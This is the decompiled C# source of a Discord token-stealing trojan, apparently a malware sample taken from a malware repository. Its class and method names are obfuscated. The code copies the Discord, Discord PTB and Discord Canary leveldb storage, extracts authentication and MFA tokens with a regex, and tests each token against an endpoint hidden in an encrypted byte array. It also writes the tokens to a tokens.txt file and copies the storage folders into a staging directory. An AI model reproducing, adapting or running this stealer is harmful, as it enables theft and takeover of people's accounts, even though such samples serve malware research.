// Decompiled with JetBrains decompiler
// Type: 至手丶戈髟瓦冖血匸牙毋斤攴糸耳.己彡弓首面瓜亅見廴戈走
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山;
using 曰乙屮月彡乙夊禾寸白衣匚子頁冖;
using 火長宀舛火尸彐方自儿丿广;

namespace 至手丶戈髟瓦冖血匸牙毋斤攴糸耳
{
  internal sealed class 己彡弓首面瓜亅見廴戈走
  {
    private static Regex 亠巛爻尸示辵言夕耒爪老毛戈 = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");
    private static string[] 牛瓦老人干衣爪乙子酉弓手 = new string[3]
    {
      "Discord\\Local Storage\\leveldb",
      "Discord PTB\\Local Storage\\leveldb",
      "Discord Canary\\leveldb"
    };

    public static void 玉厂歹巾木手矢毋巾亠土口龍(string[] 皿宀目土冖牙骨八小心辛鬯, string 矛宀飛火丨文彡比竹鬯釆毋黹屮)
    {
      if (皿宀目土冖牙骨八小心辛鬯.Length != 0)
      {
        Directory.CreateDirectory(矛宀飛火丨文彡比竹鬯釆毋黹屮);
        丿士止土巾幺山田巾弋宀小.豆卜斗甘米寸无厶凵長門 = true;
        try
        {
          foreach (string str in 皿宀目土冖牙骨八小心辛鬯)
            System.IO.File.AppendAllText(矛宀飛火丨文彡比竹鬯釆毋黹屮 + "\\tokens.txt", str + "\n");
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
      try
      {
        己彡弓首面瓜亅見廴戈走.刀己龠卩穴彳弋韋辛癶日戈門夕勹(矛宀飛火丨文彡比竹鬯釆毋黹屮);
      }
      catch
      {
      }
    }

    private static void 刀己龠卩穴彳弋韋辛癶日戈門夕勹(string 臼口幺皿尢厶韋巛臣水夂弋卜巾)
    {
      foreach (string path2 in 己彡弓首面瓜亅見廴戈走.牛瓦老人干衣爪乙子酉弓手)
      {
        string str = Path.Combine(屮大几宀白鬯士比豕玄火八父.日匸入卩爻屮夊卜网曰几廴, path2);
        string 口幺父八立干弋田弋爿戈巛皿靑 = Path.Combine(臼口幺皿尢厶韋巛臣水夂弋卜巾, new DirectoryInfo(str).Name);
        if (Directory.Exists(str))
        {
          try
          {
            風疋首弋高网瓜无力日山二儿.貝父山糸艸手水力犬网止大彐(str, 口幺父八立干弋田弋爿戈巛皿靑);
          }
          catch
          {
          }
        }
      }
    }

    private static string 爪八厂言小干尢羽力亠幺二支父雨甘高(string 氏片白入缶土牙支黹夕竹)
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          webClient.Headers.Add("Authorization", 氏片白入缶土牙支黹夕竹);
          return webClient.DownloadString(女立又口匕夂黑臣爿囗寸鬯.夂皿犬二黑无片片无臼血爪儿(new byte[48]
          {
            (byte) 204,
            (byte) 119,
            (byte) 158,
            (byte) 154,
            (byte) 23,
            (byte) 66,
            (byte) 149,
            (byte) 141,
            (byte) 183,
            (byte) 108,
            (byte) 94,
            (byte) 12,
            (byte) 88,
            (byte) 31,
            (byte) 176,
            (byte) 188,
            (byte) 18,
            (byte) 22,
            (byte) 179,
            (byte) 36,
            (byte) 224,
            (byte) 199,
            (byte) 140,
            (byte) 191,
            (byte) 17,
            (byte) 128,
            (byte) 191,
            (byte) 221,
            (byte) 16,
            (byte) 110,
            (byte) 63,
            (byte) 145,
            (byte) 150,
            (byte) 152,
            (byte) 246,
            (byte) 105,
            (byte) 199,
            (byte) 84,
            (byte) 221,
            (byte) 181,
            (byte) 90,
            (byte) 40,
            (byte) 214,
            (byte) 128,
            (byte) 166,
            (byte) 54,
            (byte) 252,
            (byte) 46
          })).Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
        }
      }
      catch
      {
      }
      return "Connection error";
    }

    public static string[] 瓦欠羽爻皿羊鬲厂卜冖牙鳥方勹()
    {
      List<string> stringList = new List<string>();
      try
      {
        foreach (string path2 in 己彡弓首面瓜亅見廴戈走.牛瓦老人干衣爪乙子酉弓手)
        {
          string str1 = Path.Combine(屮大几宀白鬯士比豕玄火八父.日匸入卩爻屮夊卜网曰几廴, path2);
          string str2 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(str1).Name);
          if (Directory.Exists(str1))
          {
            風疋首弋高网瓜无力日山二儿.貝父山糸艸手水力犬网止大彐(str1, str2);
            foreach (string file in Directory.GetFiles(str2))
            {
              if (file.EndsWith(".log") || file.EndsWith(".ldb"))
              {
                string input = System.IO.File.ReadAllText(file);
                Match match = 己彡弓首面瓜亅見廴戈走.亠巛爻尸示辵言夕耒爪老毛戈.Match(input);
                if (match.Success)
                  stringList.Add(match.Value + " - " + 己彡弓首面瓜亅見廴戈走.爪八厂言小干尢羽力亠幺二支父雨甘高(match.Value));
              }
            }
            風疋首弋高网瓜无力日山二儿.隹赤殳勹夊雨夊糸己大示匕(str2);
          }
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      return stringList.ToArray();
    }
  }
}
